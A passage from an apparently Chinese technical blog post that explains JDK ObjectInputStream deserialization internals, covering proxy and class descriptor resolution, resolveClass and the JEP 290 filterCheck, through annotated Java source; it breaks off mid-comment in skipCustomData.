找不到某个接口/无法生成代理类时抛出</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 1) 选择“最近的用户类加载器”，找不到就用 null（走引导/系统路径）</span></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">latestLoader</span> <span class="operator">=</span> latestUserDefinedLoader();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录是否存在“非 public 接口”，以及这些接口共同要求的类加载器</span></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">nonPublicLoader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">hasNonPublicInterface</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 逐个解析接口名为 Class，并校验非 public 接口的类加载器一致性</span></span><br><span class="line">    Class&lt;?&gt;[] classObjs = <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[interfaces.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; interfaces.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 被动初始化（不执行 &lt;clinit&gt;），用 latestLoader 解析接口</span></span><br><span class="line">        Class&lt;?&gt; cl = Class.forName(interfaces[i], <span class="comment">/* initialize = */</span> <span class="literal">false</span>, latestLoader);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若接口“非 public”，JDK 规定：生成的代理类必须定义在这些非 public 接口所属的</span></span><br><span class="line">        <span class="comment">// 同一个类加载器下；否则将破坏封装/可访问性，直接抛 IllegalAccessError</span></span><br><span class="line">        <span class="keyword">if</span> ((cl.getModifiers() &amp; Modifier.PUBLIC) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hasNonPublicInterface) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nonPublicLoader != cl.getClassLoader()) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalAccessError</span>(</span><br><span class="line">                        <span class="string">&quot;conflicting non-public interface class loaders&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                nonPublicLoader = cl.getClassLoader();</span><br><span class="line">                hasNonPublicInterface = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        classObjs[i] = cl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 生成代理类：</span></span><br><span class="line">    <span class="comment">//    - 若存在非 public 接口：必须使用其类加载器定义代理类；</span></span><br><span class="line">    <span class="comment">//    - 否则：使用 latestLoader（或 null）定义代理类。</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.getProxyClass(</span><br><span class="line">            hasNonPublicInterface ? nonPublicLoader : latestLoader,</span><br><span class="line">            classObjs);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// 语义统一：将参数非法（如接口重复、非接口类型等）包装为 CNF 抛给上层</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="literal">null</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>对于普通类，则先调用 <code>readClassDescriptor</code> 获取类相关信息。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从序列化流中读取一个“类描述符”（ObjectStreamClass）。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;当 OIS 期待下一个项目是“类描述符”时调用本方法。子类可覆盖以读取由</span></span><br><span class="line"><span class="comment"> * 自定义 OOS（覆盖了 writeClassDescriptor）的“非标准格式”描述符；</span></span><br><span class="line"><span class="comment"> * 默认按《对象序列化规范》定义的标准格式读取。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  读到的类描述符（仅包含“主体信息”，尚未解析为本地 Class）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  IOException            I/O 错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span>  ClassNotFoundException 若描述符体内引用的类型解析失败</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectOutputStream#writeClassDescriptor(java.io.ObjectStreamClass)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> ObjectStreamClass <span class="title function_">readClassDescriptor</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectStreamClass</span>();</span><br><span class="line">    <span class="comment">// 读取“普通（非代理）类”的描述符主体（类名、SUID、flags、字段表等）</span></span><br><span class="line">    <span class="comment">// 注意：此时得到的 desc 还不可直接用于实例读写，后续由 initNonProxy(...) 补完。</span></span><br><span class="line">    desc.readNonProxy(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> desc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从给定的 OIS 中读取“非代理类”的类描述符主体信息。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;读出的结果尚不完整：它只能作为 resolveClass(...) 和</span></span><br><span class="line"><span class="comment"> * ObjectStreamClass.initNonProxy(...) 的输入，后者会把“本地 Class、</span></span><br><span class="line"><span class="comment"> * 父类描述符”等信息补全到该描述符里。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in  输入的 ObjectInputStream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException              I/O 或协议错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException   当字段签名等需要解析的类型找不到时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">readNonProxy</span><span class="params">(ObjectInputStream in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 1) 类名（MUTF-8，二进制名，如 java.lang.String）</span></span><br><span class="line">    name = in.readUTF();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) serialVersionUID（8 字节，大端）</span></span><br><span class="line">    suid = Long.valueOf(in.readLong());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 本描述符是“非代理类”</span></span><br><span class="line">    isProxy = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 读取并解析“类标志位”</span></span><br><span class="line">    <span class="type">byte</span> <span class="variable">flags</span> <span class="operator">=</span> in.readByte();</span><br><span class="line">    <span class="comment">// 是否声明了私有 writeObject(...)：若是，实例数据会包含“自定义数据块”</span></span><br><span class="line">    hasWriteObjectData = ((flags &amp; ObjectStreamConstants.SC_WRITE_METHOD) != <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Externalizable 在 v2 协议下是否以 Block-Data 包裹（v1 不包裹）</span></span><br><span class="line">    hasBlockExternalData = ((flags &amp; ObjectStreamConstants.SC_BLOCK_DATA) != <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 是否 Externalizable（完全自管读写）</span></span><br><span class="line">    externalizable = ((flags &amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 是否 Serializable（默认/自定义 writeObject 机制）</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">sflag</span> <span class="operator">=</span> ((flags &amp; ObjectStreamConstants.SC_SERIALIZABLE) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Externalizable 与 Serializable 互斥</span></span><br><span class="line">    <span class="keyword">if</span> (externalizable &amp;&amp; sflag) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                name, <span class="string">&quot;serializable and externalizable flags conflict&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    serializable = externalizable || sflag;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否枚举类型</span></span><br><span class="line">    isEnum = ((flags &amp; ObjectStreamConstants.SC_ENUM) != <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 规范要求：枚举的 serialVersionUID 必须为 0</span></span><br><span class="line">    <span class="keyword">if</span> (isEnum &amp;&amp; suid.longValue() != <span class="number">0L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                name, <span class="string">&quot;enum descriptor has non-zero serialVersionUID: &quot;</span> + suid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 字段表</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">numFields</span> <span class="operator">=</span> in.readShort(); <span class="comment">// 字段数量（非负）</span></span><br><span class="line">    <span class="comment">// 规范要求：枚举类不应有可持久化字段</span></span><br><span class="line">    <span class="keyword">if</span> (isEnum &amp;&amp; numFields != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                name, <span class="string">&quot;enum descriptor has non-zero field count: &quot;</span> + numFields);</span><br><span class="line">    &#125;</span><br><span class="line">    fields = (numFields &gt; <span class="number">0</span>) ? <span class="keyword">new</span> <span class="title class_">ObjectStreamField</span>[numFields] : NO_FIELDS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; numFields; i++) &#123;</span><br><span class="line">        <span class="comment">// 5.1 字段类型码（原始类型：B C D F I J S Z；对象：L；数组：[）</span></span><br><span class="line">        <span class="type">char</span> <span class="variable">tcode</span> <span class="operator">=</span> (<span class="type">char</span>) in.readByte();</span><br><span class="line">        <span class="comment">// 5.2 字段名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fname</span> <span class="operator">=</span> in.readUTF();</span><br><span class="line">        <span class="comment">// 5.3 字段签名：</span></span><br><span class="line">        <span class="comment">//     - 若为对象/数组字段（L 或 [），需要读取“类型签名字符串”（使用对象字符串语义，可句柄共享）</span></span><br><span class="line">        <span class="comment">//     - 若为原始类型，则签名就是单字符类型码本身</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">signature</span> <span class="operator">=</span> ((tcode == <span class="string">&#x27;L&#x27;</span>) || (tcode == <span class="string">&#x27;[&#x27;</span>))</span><br><span class="line">                ? in.readTypeString()</span><br><span class="line">                : <span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">char</span>[]&#123; tcode &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 第三个参数 false 表示“非常量字段”（与 serialPersistentFields 的常量优化无关）</span></span><br><span class="line">            fields[i] = <span class="keyword">new</span> <span class="title class_">ObjectStreamField</span>(fname, signature, <span class="literal">false</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="comment">// 若签名非法或字段描述不合规，包装为 InvalidClassException 抛出</span></span><br><span class="line">            <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">                    name, <span class="string">&quot;invalid descriptor for field &quot;</span> + fname).initCause(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 计算字段偏移/布局信息（用于默认反序列化时按序读写原始与对象字段）</span></span><br><span class="line">    computeFieldOffsets();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后调用 <code>resolveClass</code> 根据前面读取类信息实例化的 <code>ObjectStreamClass</code> 从本地加载类。注意这里 <code>Class.forName</code> 的 <code>initialize</code> 参数为 <code>false</code> 因此不会执行静态代码块。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将流中的类描述符（ObjectStreamClass）解析为“本地 JVM 中的 Class”。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;可被子类覆盖：例如从自定义的类加载来源（网络/插件沙箱等）加载类。</span></span><br><span class="line"><span class="comment"> * 与输出端的 &#123;<span class="doctag">@code</span> ObjectOutputStream.annotateClass(..)&#125; 相对应——</span></span><br><span class="line"><span class="comment"> * 该方法对同一个类在一次反序列化过程中只会调用一次。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;返回后（若不是数组类），运行时会把返回类的 serialVersionUID 与流内的</span></span><br><span class="line"><span class="comment"> * serialVersionUID 做比较；不匹配则抛 &#123;<span class="doctag">@link</span> InvalidClassException&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;默认实现的策略：</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * Class.forName(desc.getName(), false, latestUserDefinedLoader())</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> * 其中 latestUserDefinedLoader() 会选择“当前调用栈上，最近的一个由</span></span><br><span class="line"><span class="comment"> * 用户自定义类加载器定义的类（且不是反射生成的桥接类）”的那个类加载器；</span></span><br><span class="line"><span class="comment"> * 若找不到，则使用 &#123;<span class="doctag">@code</span> null&#125;（意味着由引导/系统加载器按默认路径加载）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;兼容性补充：</span></span><br><span class="line"><span class="comment"> * 若上述加载抛出 &#123;<span class="doctag">@code</span> ClassNotFoundException&#125;，并且 &#123;<span class="doctag">@code</span> desc.getName()&#125;</span></span><br><span class="line"><span class="comment"> * 恰好是 Java 的原始类型/void 的关键字（如 &quot;int&quot;、&quot;boolean&quot;、&quot;void&quot;），</span></span><br><span class="line"><span class="comment"> * 则返回对应的 &#123;<span class="doctag">@code</span> Class&#125;（如 &#123;<span class="doctag">@code</span> Integer.TYPE&#125;、&#123;<span class="doctag">@code</span> Void.TYPE&#125;）。</span></span><br><span class="line"><span class="comment"> * 否则把原始 &#123;<span class="doctag">@code</span> ClassNotFoundException&#125; 继续抛出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> desc 流中的类描述符</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 与 desc 对应的本地 Class 对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 本方法签名允许抛 I/O 异常（默认实现通常不会抛出）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 无法在本地解析该类时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 尝试用“最近的用户自定义类加载器”按“被动初始化（不执行 clinit）”加载目标类</span></span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="comment">/* initialize = */</span> <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="comment">// 如果是原始类型或 void 的“关键字名称”，走内置映射表 primClasses 返回对应 Class</span></span><br><span class="line">        <span class="comment">// 例如：&quot;int&quot; -&gt; Integer.TYPE, &quot;boolean&quot; -&gt; Boolean.TYPE, &quot;void&quot; -&gt; Void.TYPE</span></span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 既不是原始类型名，也加载失败 → 继续把 CNF 抛给调用方</span></span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在前面完成类信息的读取以及类加载之后，都会调用 <code>filterCheck</code> 对加载的类进行检查，这个函数实际上就是 JEP290 的过滤函数。</p>
<p>该函数会调用全局默认过滤器 <code>java.io.ObjectInputStream.serialFilter</code> 的 <code>checkInput</code> 函数进行过滤。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 调用（若已配置）反序列化过滤器 &#123;<span class="doctag">@code</span> serialFilter&#125; 进行校验。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;若过滤器返回 REJECTED 或在过滤过程中抛出 RuntimeException，</span></span><br><span class="line"><span class="comment"> * 则抛出 &#123;<span class="doctag">@link</span> InvalidClassException&#125; 终止反序列化。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;过滤器用于基于 JEP 290 的“序列化过滤”能力：可按类、数组长度、对象引用数、</span></span><br><span class="line"><span class="comment"> * 嵌套深度、已读字节数等维度做允许/拒绝/未决的判定。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clazz       正在处理的类型（可能为 null，例如仅做计数检查时）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> arrayLength 若当前创建/读取的是数组，则为数组长度；非数组传 &#123;<span class="doctag">@code</span> -1&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InvalidClassException 当过滤器拒绝或在过滤过程中抛出运行时异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">filterCheck</span><span class="params">(Class&lt;?&gt; clazz, <span class="type">int</span> arrayLength)</span></span><br><span class="line">        <span class="keyword">throws</span> InvalidClassException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialFilter != <span class="literal">null</span>) &#123; <span class="comment">// 未配置过滤器则直接跳过</span></span><br><span class="line">        <span class="type">RuntimeException</span> <span class="variable">ex</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        ObjectInputFilter.Status status;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 若被子类覆盖导致无法获取流信息，则 bytesRead 置 0</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">bytesRead</span> <span class="operator">=</span> (bin == <span class="literal">null</span>) ? <span class="number">0</span> : bin.getBytesRead();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 传入一次性快照：类、数组长度、已见对象引用数、当前嵌套深度、已读字节</span></span><br><span class="line">            status = serialFilter.checkInput(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">FilterValues</span>(clazz, arrayLength, totalObjectRefs, depth, bytesRead));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="comment">// 过滤器自身抛出运行时异常：按“拒绝”处理，同时记录异常作为原因</span></span><br><span class="line">            status = ObjectInputFilter.Status.REJECTED;</span><br><span class="line">            ex = e;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 仅当返回 REJECTED 或返回 null（实现不规范）时视为拒绝</span></span><br><span class="line">        <span class="keyword">if</span> (status == <span class="literal">null</span> || status == ObjectInputFilter.Status.REJECTED) &#123;</span><br><span class="line">            <span class="comment">// 失败路径：info 等级日志（若开启）</span></span><br><span class="line">            <span class="keyword">if</span> (Logging.infoLogger != <span class="literal">null</span>) &#123;</span><br><span class="line">                Logging.infoLogger.info(</span><br><span class="line">                    <span class="string">&quot;ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;&quot;</span>,</span><br><span class="line">                    status, clazz, arrayLength, totalObjectRefs, depth, bytesRead,</span><br><span class="line">                    Objects.toString(ex, <span class="string">&quot;n/a&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">InvalidClassException</span> <span class="variable">ice</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;filter status: &quot;</span> + status);</span><br><span class="line">            ice.initCause(ex); <span class="comment">// 将过滤器抛出的运行时异常作为根因链入</span></span><br><span class="line">            <span class="keyword">throw</span> ice;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 成功/未决路径：trace 等级日志（若开启）</span></span><br><span class="line">            <span class="keyword">if</span> (Logging.traceLogger != <span class="literal">null</span>) &#123;</span><br><span class="line">                Logging.traceLogger.finer(</span><br><span class="line">                    <span class="string">&quot;ObjectInputFilter &#123;0&#125;: &#123;1&#125;, array length: &#123;2&#125;, nRefs: &#123;3&#125;, depth: &#123;4&#125;, bytes: &#123;5&#125;, ex: &#123;6&#125;&quot;</span>,</span><br><span class="line">                    status, clazz, arrayLength, totalObjectRefs, depth, bytesRead,</span><br><span class="line">                    Objects.toString(ex, <span class="string">&quot;n/a&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在结束了反序列化内容检测后，会调用 <code>skipCustomData</code> <strong>把当前“自定义数据区”（custom data）里的一切都吃掉，直到读到 <code>TC_ENDBLOCKDATA</code> 为止</strong>——不管里面是纯块数据，还是中间夹了对象&#x2F;数组&#x2F;字符串之类的结构化东西。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 跳过“自定义数据区”（custom data）：持续消费所有 Block-Data 块以及其间</span></span><br><span class="line"><span class="comment"> * 可能穿插的对象，直到遇到结构化标记 TC_ENDBLOCKDATA 为止。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型使用场景：</span></span><br><span class="line"><span class="comment"> * - 类/代理类“注解块”（classAnnotations）：在 writeNonProxyDesc /</span></span><br><span class="line"><span class="comment"> *   writeProxyDesc 中，子类可在 Block-Data 模式下通过 annotateClass /</span></span><br><span class="line"><span class="comment"> *   annotateProxyClass 写入任意原始字节，甚至调用 writeObject 写入对象；</span></span><br><span class="line"><span class="comment"> *   读取端需把这些内容全部吞掉，直至 ENDBLOCKDATA。</span></span><br><span class="line"><span class="comment"> * - Serializable 层级中声明了 writeObject(...) 的“自定义数据区”：</span></span><br><span class="line"><span class="comment"> *   